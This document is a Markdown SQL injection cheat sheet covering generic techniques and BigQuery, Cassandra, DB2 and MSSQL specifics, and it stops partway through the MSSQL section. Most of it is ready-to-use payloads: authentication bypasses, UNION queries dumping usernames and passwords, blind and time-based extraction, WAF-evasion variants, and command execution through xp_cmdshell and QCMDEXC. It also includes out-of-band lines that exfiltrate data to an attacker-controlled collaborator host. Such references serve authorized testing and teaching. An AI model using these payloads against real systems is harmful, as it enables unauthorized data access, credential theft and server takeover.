# SQL Injection

> SQL Injection (SQLi)  is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. SQL Injection is one of the most common and severe types of web application vulnerabilities, enabling attackers to execute arbitrary SQL code on the database. This can lead to unauthorized data access, data manipulation, and, in some cases, full compromise of the database server.

## Tools

* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool
* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws

## Entry Point Detection

Detecting the entry point in SQL injection (SQLi) involves identifying locations in an application where user input is not properly sanitized before it is included in SQL queries.

* **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
    * Simple characters: `'`, `"`, `;`, `)` and `*`
    * Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
    * Multiple encoding: `%%2727`, `%25%27`
    * Unicode characters: `U+02BA`, `U+02B9`
        * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)
        * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')

* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
    * Merging characters

      ```sql
      `+HERP
      '||'DERP
      '+'herp
      ' 'DERP
      '%20'HERP
      '%2B'HERP
      ```

    * Logic Testing

      ```sql
      page.asp?id=1 or 1=1 -- true
      page.asp?id=1' or 1=1 -- true
      page.asp?id=1" or 1=1 -- true
      page.asp?id=1 and 1=2 -- false
      ```

* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.

## DBMS Identification

### DBMS Identification Keyword Based

Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.

| DBMS                | SQL Payload                     |
| ------------------- | ------------------------------- |
| MySQL               | `conv('a',16,2)=conv('a',16,2)` |
| MySQL               | `connection_id()=connection_id()` |
| MySQL               | `crc32('MySQL')=crc32('MySQL')` |
| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
| MSSQL               | `@@CONNECTIONS>0` |
| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |
| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |
| MSSQL               | `USER_ID(1)=USER_ID(1)` |
| ORACLE              | `ROWNUM=ROWNUM` |
| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
| ORACLE              | `LNNVL(0=123)` |
| POSTGRESQL          | `5::int=5` |
| POSTGRESQL          | `5::integer=5` |
| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |
| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |
| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |
| POSTGRESQL          | `current_database()=current_database()` |
| SQLITE              | `sqlite_version()=sqlite_version()` |
| SQLITE              | `last_insert_rowid()>1` |
| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |
| MSACCESS            | `val(cvar(1))=1` |
| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |

### DBMS Identification Error Based

Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.

| DBMS                | Example Error Message                                                                    | Example Payload |
| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |
| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |
| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |

## Authentication Bypass

In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this:

```SQL
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

An attacker can attempt to inject malicious SQL code into the username or password fields. For instance, if the attacker types the following in the username field:

```sql
' OR '1'='1'--
```

This payload is injecting an always true statement into the username field and comment the rest SQL query.
The attacker can write anything in the password field because the resulting SQL query will not check it anymore.

```SQL
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```

Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.

:warning: In this case, the database will return an array of results because it will match every users in the table. This will produce an error in the server side since it was expecting only one result. By adding a `LIMIT` clause, you can restrict the number of rows returned by the query.

By submitting the following payload in the username field, you will log in as the first user in the database. Additionally, you can inject a payload in the password field while using the correct username to target a specific user.

```sql
' or 1=1 limit 1 --
```

:warning: Avoid using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.

### Raw MD5 and SHA1

In PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.

```php
sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.

| Hash | Input    | Output (Raw)            |  Payload  |
| ---- | -------- | ----------------------- | --------- |
| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`    |
| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8` | `'or'` |
| sha1 | 3fDf     | `Q�u'='�@�[�t�- o��_-!` | `'='`     |
| sha1 | 178374   | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`     |
| sha1 | 17       | `Ùp2ûjww%6\`            | `\`       |

This behavior can be abused to bypass the authentication by escaping the context.

```php
sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'";
```

### Hashed Passwords

By 2025, applications almost never store plaintext passwords. Authentication systems instead use a representation of the password (a hash derived by a key-derivation function, often with a salt). That evolution changes the mechanics of some classic SQL injection (SQLi) bypasses: an attacker who injects rows via `UNION` must now supply values that match the stored representation the application expects, not the user's raw password.

Many naïve authentication flows perform these high-level steps:

* Query the database for the user record (e.g., `SELECT username, password_hash FROM users WHERE username = ?`).
* Receive the stored `password_hash` from the DB.
* Locally compute `hash(input_password)` using whatever algorithm is configured.
* Compare `stored_password_hash == hash(input_password)`.

If an attacker can inject an extra row into the result set (for example using `UNION`), they can make the application receive an attacker-controlled stored_password_hash. If that injected hash equals `hash(attacker_supplied_password)` as computed by the app, the comparison succeeds and the attacker is authenticated as the injected username.

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
```

* `AND 1=0`: to force the request to be false.
* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: select as many columns as necessary, here 161ebd7d45089b3446ee4e0d86dbcf92 corresponds to `MD5("P@ssw0rd")`.

If the application computes `MD5("P@ssw0rd")` and that equals `161ebd7d45089b3446ee4e0d86dbcf92`, then supplying `"P@ssw0rd"` as the login password will pass the check.

This method fails if the app stores `salt` and `KDF(salt, password)`. A single injected static hash cannot match a per-user salted result unless the attacker also knows or controls the salt and KDF parameters.

## UNION Based Injection

In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.

Let's assume a vulnerable web application retrieves product details based on a product ID from a database:

```sql
SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
```

An attacker could modify the `input_id` to include the data from another table like `users`.

```SQL
1' UNION SELECT username, password FROM users --
```

After submitting our payload, the query become the following SQL:

```SQL
SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
```

:warning: The 2 SELECT clauses must have the same number of columns.

## Error Based Injection

Error-Based SQL Injection is a technique that relies on the error messages returned from the database to gather information about the database structure. By manipulating the input parameters of an SQL query, an attacker can make the database generate error messages. These errors can reveal critical details about the database, such as table names, column names, and data types, which can be used to craft further attacks.

For example, on a PostgreSQL, injecting this payload in a SQL query would result in an error since the LIMIT clause is expecting a numeric value.

```sql
LIMIT CAST((SELECT version()) as numeric) 
```

The error will leak the output of the `version()`.

```ps1
ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
```

## Blind Injection

Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response.

### Boolean Based Injection

Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returns TRUE or FALSE. The attacker can infer information based on differences in the behavior of the application.

Size of the page, HTTP response code, or missing parts of the page are strong indicators to detect whether the Boolean-based Blind SQL injection was successful.

Here is a naive example to recover the content of the `@@hostname` variable.

**Identify Injection Point and Confirm Vulnerability** : Inject a payload that evaluates to true/false to confirm SQL injection vulnerability. For example:

```ps1
http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
```

**Extract Hostname Length**: Guess the length of the hostname by incrementing until the response indicates a match. For example:

```ps1
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
```

**Extract Hostname Characters** : Extract each character of the hostname using substring and ASCII comparison:

```ps1
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
```

Then repeat the method to discover every characters of the `@@hostname`. Obviously this example is not the fastest way to obtain them. Here are a few pointers to speed it up:

* Extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient.

### Blind Error Based Injection

Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.

**Example**: Using `json()` function in SQLite to trigger an error as an oracle to know when the injection is true or false.

```sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```

### Time Based Injection

Time-based SQL Injection is a type of blind SQL Injection attack that relies on database delays to infer whether certain queries return true or false. It is used when an application does not display any direct feedback from the database queries but allows execution of time-delayed SQL commands. The attacker can analyze the time it takes for the database to respond to indirectly gather information from the database.

* Default `SLEEP` function for the database

```sql
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```

* Heavy queries that take a lot of time to complete, usually crypto functions.

```sql
BENCHMARK(2000000,MD5(NOW()))
```

Let's see a basic example to recover the version of the database using a time based sql injection.

```sql
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
```

If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.

### Out of Band (OAST)

Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable.

Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration:

* MySQL

  ```sql
  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
  ```

* MSSQL

  ```sql
  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
  ```

## Stacked Based Injection

Stacked Queries SQL Injection is a technique where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application configurations support stacked queries.

```sql
1; EXEC xp_cmdshell('whoami') --
```

## Polyglot Injection

A polygot SQL injection payload is a specially crafted SQL injection attack string that can successfully execute in multiple contexts or environments without modification. This means that the payload can bypass different types of validation, parsing, or execution logic in a web application or database by being valid SQL in various scenarios.

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Routed Injection

> Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus Javanicus

In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.

**Example 1**:

`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`

```sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

**Example 2**:

`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.

```sql
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

## Second Order SQL Injection

Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.
Unlike first-order SQLi, the injection doesn't happen right away. It is **triggered in a separate step**, often in a different part of the application.

1. User submits input that is stored (e.g., during registration or profile update).

   ```text
   Username: attacker'--
   Email: attacker@example.com
   ```

2. That input is saved **without validation** but doesn't trigger a SQL injection.

   ```sql
   INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
   ```

3. Later, the application retrieves and uses the stored data in a SQL query.

   ```python
   query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
   ```

4. If this query is built unsafely, the injection is triggered.

## PDO Prepared Statements

PDO, or PHP Data Objects, is an extension for PHP that provides a consistent and secure way to access and interact with databases. It is designed to offer a standardized approach to database interaction, allowing developers to use a consistent API across multiple types of databases like MySQL, PostgreSQL, SQLite, and more.

PDO allows for binding of input parameters, which ensures that user data is properly sanitized before being executed as part of a SQL query. However it might still be vulnerable to SQL injections if the developers allowed user input inside the SQL query.

**Requirements**:

* DMBS
    * **MySQL** is vulnerable by default.
    * **Postgres** is not vulnerable by default, unless the emulation is turned on with `PDO::ATTR_EMULATE_PREPARES => true`.
    * **SQLite** is not vulnerable to this attack.

* SQL injection anywhere inside a PDO statement: `$pdo->prepare("SELECT $INJECT_SQL_HERE...")`.
* PDO used for another SQL parameter, either with `?` or `:parameter`.

    ```php
    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
    $col = '`' . str_replace('`', '``', $_GET['col']) . '`';

    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = ?");
    $stmt->execute([$_GET['name']]);
    // or
    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = :name");
    $stmt->execute(['name' => $_GET['name']]);
    ```

**Methodology**:

**NOTE**: In PHP 8.3 and lower, the injection happens even without a null byte (`\0`). The attacker only needs to smuggle a "`:`" or a "`?`".

* Detect the SQLi using `?#\0`: `GET /index.php?col=%3f%23%00&name=anything`

    ```ps1
    # 1st Payload: ?#\0
    # 2nd Payload: anything
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1
    ```

* Force a select \`'x\` instead of a column name and create a comment. Inject a backtick to fix the column and terminate the SQL query with `;#`: `GET /index.php?col=%3f%23%00&name=x%60;%23`

    ```ps1
    # 1st Payload: ?#\0
    # 2nd Payload: x`;#
    Column not found: 1054 Unknown column ''x' in 'SELECT'
    ```

* Inject in second parameter the payload. `GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523`

    ```ps1
    # 1st Payload: \?#\0
    # 2nd Payload: x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
    ALL_PLUGINS
    APPLICABLE_ROLES
    CHARACTER_SETS
    CHECK_CONSTRAINTS
    COLLATIONS
    COLLATION_CHARACTER_SET_APPLICABILITY
    COLUMNS
    ```

* Final SQL queries

    ```SQL
    -- Before $pdo->prepare
    SELECT `\?#\0` FROM animals WHERE name = ?

    -- After $pdo->prepare
    SELECT `\'x` FROM (SELECT table_name AS `\'x` from information_schema.tables)y;#'#\0` FROM animals WHERE name = ?
    ```

## Generic WAF Bypass

---

### No Space Allowed

Some web applications attempt to secure their SQL queries by blocking or stripping space characters to prevent simple SQL injection attacks. However, attackers can bypass these filters by using alternative whitespace characters, comments, or creative use of parentheses.

#### Alternative Whitespace Characters

Most databases interpret certain ASCII control characters and encoded spaces (such as tabs, newlines, etc.) as whitespace in SQL statements. By encoding these characters, attackers can often evade space-based filters.

| Example Payload               | Description                      |
|-------------------------------|----------------------------------|
| `?id=1%09and%091=1%09--`      | `%09` is tab (`\t`)              |
| `?id=1%0Aand%0A1=1%0A--`      | `%0A` is line feed (`\n`)        |
| `?id=1%0Band%0B1=1%0B--`      | `%0B` is vertical tab            |
| `?id=1%0Cand%0C1=1%0C--`      | `%0C` is form feed               |
| `?id=1%0Dand%0D1=1%0D--`      | `%0D` is carriage return (`\r`)  |
| `?id=1%A0and%A01=1%A0--`      | `%A0` is non-breaking space      |

**ASCII Whitespace Support by Database**:

| DBMS         | Supported Whitespace Characters (Hex)            |
|--------------|--------------------------------------------------|
| SQLite3      | 0A, 0D, 0C, 09, 20                               |
| MySQL 5      | 09, 0A, 0B, 0C, 0D, A0, 20                       |
| MySQL 3      | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
| PostgreSQL   | 0A, 0D, 0C, 09, 20                               |
| Oracle 11g   | 00, 0A, 0D, 0C, 09, 20                           |
| MSSQL        | 01–1F, 20                                        |

#### Bypassing with Comments and Parentheses

SQL allows comments and grouping, which can break up keywords and queries, thus defeating space filters:

| Bypass                                    | Technique            |
| ----------------------------------------- | -------------------- |
| `?id=1/*comment*/AND/**/1=1/**/--`        | Comment              |
| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |
| `?id=(1)and(1)=(1)--`                     | Parenthesis          |

### No Comma Allowed

Bypass using `OFFSET`, `FROM` and `JOIN`.

| Forbidden           | Bypass |
| ------------------- | ------ |
| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0` |
| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |
| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |

### No Equal Allowed

Bypass using LIKE/NOT IN/IN/BETWEEN

| Bypass    | SQL Example |
| --------- | ------------------------------------------ |
| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |
| `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |
| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |

### Case Modification

Bypass using uppercase/lowercase.

| Bypass    | Technique  |
| --------- | ---------- |
| `AND`     | Uppercase  |
| `and`     | Lowercase  |
| `aNd`     | Mixed case |

Bypass using keywords case insensitive or an equivalent operator.

| Forbidden | Bypass                      |
| --------- | --------------------------- |
| `AND`     | `&&`                        |
| `OR`      | `\|\|`                      |
| `=`       | `LIKE`, `REGEXP`, `BETWEEN` |
| `>`       | `NOT BETWEEN 0 AND X`       |
| `WHERE`   | `HAVING`                    |


---

# Google BigQuery SQL Injection

> Google BigQuery SQL Injection  is a type of security vulnerability where an attacker can execute arbitrary SQL queries on a Google BigQuery database by manipulating user inputs that are incorporated into SQL queries without proper sanitization. This can lead to unauthorized data access, data manipulation, or other malicious activities.

## Detection

* Use a classic single quote to trigger an error: `'`
* Identify BigQuery using backtick notation: ```SELECT .... FROM `` AS ...```

| SQL Query                                             | Description |
| ----------------------------------------------------- | -------------------- |
| `SELECT @@project_id`                                 | Gathering project id |
| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names |
| `select * from project_id.dataset_name.table_name`    | Gathering data from specific project id & dataset |

## BigQuery Comment

| Type                       | Description                       |
|----------------------------|-----------------------------------|
| `#`                        | Hash comment                      |
| `/* PostgreSQL Comment */` | C-style comment                   |

## BigQuery Union Based

```ps1
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## BigQuery Error Based

| SQL Query                                                | Description          |
| -------------------------------------------------------- | -------------------- |
| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |
| `select CAST(@@project_id AS INT64)`                     | Casting              |

## BigQuery Boolean Based

```ps1
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

## BigQuery Time Based

* Time based functions does not exist in the BigQuery syntax.


---

# Cassandra Injection

> Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system.

## CQL Injection Limitations

* Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements, which makes cross-table queries more challenging.

* Additionally, Cassandra lacks convenient built-in functions like `DATABASE()` or `USER()` for retrieving database metadata.

* Another limitation is the absence of the `OR` operator in CQL, which prevents creating always-true conditions; for instance, a query like `SELECT * FROM table WHERE col1='a' OR col2='b';` will be rejected.

* Time-based SQL injections, which typically rely on functions like `SLEEP()` to introduce a delay, are also difficult to execute in CQL since it doesn’t include a `SLEEP()` function.

* CQL does not allow subqueries or other nested statements, so a query like `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` would be rejected.

## Cassandra Comment

```sql
/* Cassandra Comment */
```

## Cassandra Login Bypass

### Example #1

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

### Example #2

```sql
username: admin'/*
password: */and pass>'
```

The injection would look like the following SQL query

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```


---

# DB2 Injection

> IBM DB2 is a family of relational database management systems (RDBMS) developed by IBM. Originally created in the 1980s for mainframes, DB2 has evolved to support various platforms and workloads, including distributed systems, cloud environments, and hybrid deployments.

## DB2 Comments

| Type                       | Description                       |
| -------------------------- | --------------------------------- |
| `--`                       | SQL comment                       |

## DB2 Default Databases

| Name        | Description                                                           |
| ----------- | --------------------------------------------------------------------- |
| SYSIBM      | Core system catalog tables storing metadata for database objects.     |
| SYSCAT      | User-friendly views for accessing metadata in the SYSIBM tables.      |
| SYSSTAT     | Statistics tables used by the DB2 optimizer for query optimization.   |
| SYSPUBLIC   | Metadata about objects available to all users (granted to PUBLIC).    |
| SYSIBMADM   | Administrative views for monitoring and managing the database system. |
| SYSTOOLs    | Tools, utilities, and auxiliary objects provided for database administration and troubleshooting. |

## DB2 Enumeration

| Description      | SQL Query |
| ---------------- | ----------------------------------------- |
| DBMS version     | `select versionnumber, version_timestamp from sysibm.sysversions;` |
| DBMS version     | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo` |
| DBMS version     | `select getvariable('sysibm.version') from sysibm.sysdummy1` |
| DBMS version     | `select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo` |
| DBMS version     | `select service_level,bld_level from sysibmadm.env_inst_info` |
| Current user     | `select user from sysibm.sysdummy1` |
| Current user     | `select session_user from sysibm.sysdummy1` |
| Current user     | `select system_user from sysibm.sysdummy1` |
| Current database | `select current server from sysibm.sysdummy1` |
| OS info          | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info` |

## DB2 Methodology

| Description      | SQL Query |
| ---------------- | ------------------------------------ |
| List databases   | `SELECT distinct(table_catalog) FROM sysibm.tables` |
| List databases   | `SELECT schemaname FROM syscat.schemata;` |
| List columns     | `SELECT name, tbname, coltype FROM sysibm.syscolumns` |
| List tables      | `SELECT table_name FROM sysibm.tables` |
| List tables      | `SELECT name FROM sysibm.systables` |
| List tables      | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'` |

## DB2 Error Based

```sql
-- Returns all in one xml-formatted string
select xmlagg(xmlrow(table_schema)) from sysibm.tables

-- Same but without repeated elements
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)

-- Returns all in one xml-formatted string.
-- May need CAST(xml2clob(… AS varchar(500)) to display the result.
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables 
```

## DB2 Blind Based

| Description      | SQL Query |
| ---------------- | ------------------------------------------ |
| Substring        | `select substr('abc',2,1) FROM sysibm.sysdummy1` |
| ASCII value      | `select chr(65) from sysibm.sysdummy1`     |
| CHAR to ASCII    | `select ascii('A') from sysibm.sysdummy1`  |
| Select Nth Row   | `select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only` |
| Bitwise AND      | `select bitand(1,0) from sysibm.sysdummy1` |
| Bitwise AND NOT  | `select bitandnot(1,0) from sysibm.sysdummy1` |
| Bitwise OR       | `select bitor(1,0) from sysibm.sysdummy1`  |
| Bitwise XOR      | `select bitxor(1,0) from sysibm.sysdummy1` |
| Bitwise NOT      | `select bitnot(1,0) from sysibm.sysdummy1` |

## DB2 Time Based

Heavy queries, if user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response.

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```

## DB2 Command Execution

> The QSYS2.QCMDEXC() procedure and scalar function can be used to execute IBM i CL commands.

Using the `QSYS2.QCMDEXC()` on IBM i (previously named AS-400), it is possibile to achieve command execution.

```sql
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
```

## DB2 WAF Bypass

### Avoiding Quotes

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
```

## DB2 Accounts and Privileges

| Description      | SQL Query |
| ---------------- | ------------------------------------ |
| List users | `select distinct(grantee) from sysibm.systabauth` |
| List users | `select distinct(definer) from syscat.schemata` |
| List users | `select distinct(authid) from sysibmadm.privileges` |
| List users | `select grantee from syscat.dbauth` |
| List privileges | `select * from syscat.tabauth` |
| List privileges | `select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies` |
| List DBA accounts | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'` |
| List DBA accounts | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'` |
| Location of DB files | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'` |


---

# MSSQL Injection

> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or "inject" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server.

## MSSQL Default Databases

| Name                  | Description                           |
|-----------------------|---------------------------------------|
| pubs                 | Not available on MSSQL 2005           |
| model                 | Available in all versions             |
| msdb                 | Available in all versions             |
| tempdb             | Available in all versions             |
| northwind             | Available in all versions             |
| information_schema | Available from MSSQL 2000 and higher  |

## MSSQL Comments

| Type                       | Description                       |
|----------------------------|-----------------------------------|
| `/* MSSQL Comment */`      | C-style comment                   |
| `--`                       | SQL comment                       |
| `;%00`                     | Null byte                         |

## MSSQL Enumeration

| Description     | SQL Query |
| --------------- | ----------------------------------------- |
| DBMS version    | `SELECT @@version`                        |
| Database name   | `SELECT DB_NAME()`                        |
| Database schema | `SELECT SCHEMA_NAME()`                    |
| Hostname        | `SELECT HOST_NAME()`                      |
| Hostname        | `SELECT @@hostname`                       |
| Hostname        | `SELECT @@SERVERNAME`                     |
| Hostname        | `SELECT SERVERPROPERTY('productversion')` |
| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |
| Hostname        | `SELECT SERVERPROPERTY('edition')`        |
| User            | `SELECT CURRENT_USER`                     |
| User            | `SELECT user_name();`                     |
| User            | `SELECT system_user;`                     |
| User            | `SELECT user;`                            |

### MSSQL List Databases

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- for N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb 
-- (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
```

### MSSQL List Tables

```sql
-- use xtype = 'V' for views
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
